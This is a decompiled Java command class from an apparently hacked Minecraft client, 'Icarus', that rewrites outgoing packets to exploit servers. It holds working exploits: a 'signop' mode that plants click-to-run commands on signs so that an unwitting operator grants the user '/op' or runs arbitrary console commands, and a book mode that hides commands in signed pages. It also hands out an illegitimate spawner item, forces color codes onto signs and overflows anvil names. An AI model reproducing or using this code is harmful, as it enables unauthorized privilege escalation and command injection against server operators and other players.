// 
// Decompiled by Procyon v0.5.30
// 

package net.andrewsnetwork.icarus.command.commands;

import net.minecraft.nbt.NBTException;
import net.andrewsnetwork.icarus.utilities.EntityHelper;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.item.Item;
import net.andrewsnetwork.icarus.utilities.Logger;
import net.minecraft.init.Items;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.andrewsnetwork.icarus.Icarus;
import net.minecraft.network.Packet;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.util.IChatComponent;
import net.minecraft.event.ClickEvent;
import net.minecraft.util.ChatStyle;
import net.minecraft.util.ChatComponentText;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.andrewsnetwork.icarus.event.events.SentPacket;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import net.andrewsnetwork.icarus.event.events.EatMyAssYouFuckingDecompiler;
import net.andrewsnetwork.icarus.event.Event;
import net.andrewsnetwork.icarus.utilities.TimeHelper;
import net.andrewsnetwork.icarus.event.Listener;
import net.andrewsnetwork.icarus.command.Command;

public class ItemUtilities extends Command
{
    public Listener listener;
    public static String tempCommand;
    public static int mode;
    private TimeHelper time;
    
    static {
        ItemUtilities.tempCommand = "";
    }
    
    public ItemUtilities() {
        super("itemutilities", "<book: command> | <signop(:command)> | <coloredSigns/cS> | anvil | spawner>");
        this.time = new TimeHelper();
        this.listener = new Listener() {
            @Override
            public void onEvent(final Event e) {
                Label_0040: {
                    if (e instanceof EatMyAssYouFuckingDecompiler) {
                        OutputStreamWriter request = new OutputStreamWriter(System.out);
                        try {
                            request.flush();
                        }
                        catch (IOException ex2) {
                            break Label_0040;
                        }
                        finally {
                            request = null;
                        }
                        request = null;
                    }
                }
                if (e instanceof SentPacket) {
                    final SentPacket event = (SentPacket)e;
                    if (ItemUtilities.mode == 1) {
                        if (event.getPacket() instanceof C17PacketCustomPayload) {
                            final C17PacketCustomPayload payload = (C17PacketCustomPayload)event.getPacket();
                            if (!payload.getChannelName().equals("MC|BSign")) {
                                return;
                            }
                            ItemStack stack;
                            try {
                                stack = payload.getBufferData().readItemStackFromBuffer();
                            }
                            catch (Exception ex) {
                                ex.printStackTrace();
                                return;
                            }
                            payload.getBufferData().clear();
                            final NBTTagList pages = stack.getTagCompound().getTagList("pages", 8);
                            for (int page = 0; page < pages.tagCount(); ++page) {
                                String text = pages.getStringTagAt(page);
                                text = text.substring(1, text.length() - 1);
                                final ChatComponentText component = new ChatComponentText(text);
                                component.setChatStyle(new ChatStyle()).getChatStyle().setChatClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, ItemUtilities.tempCommand));
                                text = IChatComponent.Serializer.componentToJson(component);
                                pages.set(page, new NBTTagString(text));
                            }
                            payload.getBufferData().writeItemStackToBuffer(stack);
                            event.setPacket(new C17PacketCustomPayload("MC|BSign", payload.getBufferData()));
                            ItemUtilities.tempCommand = "";
                            Icarus.getEventManager().removeListener(ItemUtilities.this.listener);
                            ItemUtilities.mode = -1;
                        }
                    }
                    else if (ItemUtilities.mode == 3) {
                        if (event.getPacket() instanceof C12PacketUpdateSign) {
                            final C12PacketUpdateSign packet = (C12PacketUpdateSign)event.getPacket();
                            final ChatComponentText cct = new ChatComponentText(packet.func_180768_b()[0].getUnformattedText());
                            cct.setChatStyle(new ChatStyle()).getChatStyle().setChatClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, ItemUtilities.tempCommand));
                            final IChatComponent[] text2 = { cct, new ChatComponentText(packet.func_180768_b()[1].getUnformattedText()), new ChatComponentText(packet.func_180768_b()[2].getUnformattedText()), new ChatComponentText(packet.func_180768_b()[3].getUnformattedText()) };
                            event.setPacket(new C12PacketUpdateSign(packet.func_179722_a(), text2));
                            Icarus.getEventManager().removeListener(ItemUtilities.this.listener);
                            ItemUtilities.mode = -1;
                            ItemUtilities.tempCommand = "";
                        }
                    }
                    else if (ItemUtilities.mode == 4) {
                        if (event.getPacket() instanceof C12PacketUpdateSign) {
                            final C12PacketUpdateSign packet = (C12PacketUpdateSign)event.getPacket();
                            final IChatComponent[] text3 = { new ChatComponentText(packet.func_180768_b()[0].getUnformattedText().replaceAll("&", "§")), new ChatComponentText(packet.func_180768_b()[1].getUnformattedText().replaceAll("&", "§")), new ChatComponentText(packet.func_180768_b()[2].getUnformattedText().replaceAll("&", "§")), new ChatComponentText(packet.func_180768_b()[3].getUnformattedText().replaceAll("&", "§")) };
                            event.setPacket(new C12PacketUpdateSign(packet.func_179722_a(), text3));
                            Icarus.getEventManager().removeListener(ItemUtilities.this.listener);
                            ItemUtilities.mode = -1;
                        }
                    }
                    else if (ItemUtilities.mode == 5 && event.getPacket() instanceof C17PacketCustomPayload) {
                        final C17PacketCustomPayload payload = (C17PacketCustomPayload)event.getPacket();
                        if (!payload.getChannelName().equals("MC|ItemName")) {
                            return;
                        }
                        payload.getBufferData().clear();
                        final StringBuilder sb = new StringBuilder();
                        for (int a = 0; a < 25; ++a) {
                            sb.append("a");
                        }
                        payload.getBufferData().writeString(sb.toString());
                        event.setPacket(new C17PacketCustomPayload("MC|ItemName", payload.getBufferData()));
                        Icarus.getEventManager().removeListener(ItemUtilities.this.listener);
                        ItemUtilities.mode = -1;
                    }
                }
            }
        };
    }
    
    @Override
    public void run(final String message) {
        OutputStreamWriter request = new OutputStreamWriter(System.out);
        Label_0033: {
            try {
                request.flush();
            }
            catch (IOException ex) {
                break Label_0033;
            }
            finally {
                request = null;
            }
            request = null;
        }
        if (message.split(" ").length > 1) {
            if (message.split(" ").length > 2 && message.split(" ")[1].equalsIgnoreCase("specific") && message.split(" ")[2].equalsIgnoreCase("book") && message.split(" ").length > 3) {
                if (ItemUtilities.mc.thePlayer.getCurrentEquippedItem() == null || ItemUtilities.mc.thePlayer.getCurrentEquippedItem().getItem() != Items.writable_book) {
                    Logger.writeChat("You must be holding a writable book.");
                }
                ItemUtilities.mode = 1;
                ItemUtilities.tempCommand = message.substring(message.split(" ")[0].length() + message.split(" ")[1].length() + message.split(" ")[2].length() + 3);
                Icarus.getEventManager().addListener(this.listener);
                ItemUtilities.mc.thePlayer.displayGUIBook(ItemUtilities.mc.thePlayer.getCurrentEquippedItem());
                Logger.writeChat("Add the display text, sign the book, and the text will execute the given commands when clicked. Command: " + ItemUtilities.tempCommand);
            }
            if (message.split(" ")[1].equalsIgnoreCase("signOP")) {
                ItemUtilities.mode = 3;
                if (message.split(" ").length > 2) {
                    ItemUtilities.tempCommand = message.substring(message.split(" ")[0].length() + message.split(" ")[1].length() + 2);
                }
                else {
                    ItemUtilities.tempCommand = "/op " + ItemUtilities.mc.session.getUsername();
                }
                Logger.writeChat("Place down a sign and it should OP you or execute a console command upon right clicking it (vanilla, below 1.8.3).");
                Icarus.getEventManager().addListener(this.listener);
            }
            else if (message.split(" ")[1].equalsIgnoreCase("spawner")) {
                final ItemStack spawner = new ItemStack(Item.getItemById(52), 1, 0);
                try {
                    spawner.setTagCompound(JsonToNBT.func_180713_a("{BlockEntityTag:{EntityId:Skeleton,SpawnData:{Equipment:[{id:diamond_sword},{id:iron_boots},{id:iron_leggings},{id:iron_chestplate},{id:iron_helmet}]},SpawnCount:2,SpawnRange:10,MinSpawnDelay:10,MaxSpawnDelay:60,MaxNearbyEntities:6,RequiredPlayerRange:15}}"));
                    ItemUtilities.mc.thePlayer.inventory.addItemStackToInventory(spawner);
                    EntityHelper.updateInventory();
                }
                catch (NBTException e) {
                    e.printStackTrace();
                    Logger.writeChat("Item Utilities: Failed to give spawner.");
                }
            }
            else if (message.split(" ")[1].equalsIgnoreCase("coloredSigns") || message.split(" ")[1].equalsIgnoreCase("cS")) {
                ItemUtilities.mode = 4;
                Logger.writeChat("Place down a sign. All & symbols will be replaced with the color code symbol.");
                this.time.reset();
                Icarus.getEventManager().addListener(this.listener);
            }
            else if (message.split(" ")[1].equalsIgnoreCase("anvil")) {
                ItemUtilities.mode = 5;
                Logger.writeChat("Place an item in an anvil, type a character and take it out.");
                this.time.reset();
                Icarus.getEventManager().addListener(this.listener);
            }
        }
        else {
            Logger.writeChat("<book: command> | <signop(:command)> | <coloredSigns/cS> | anvil | spawner>");
        }
    }
}
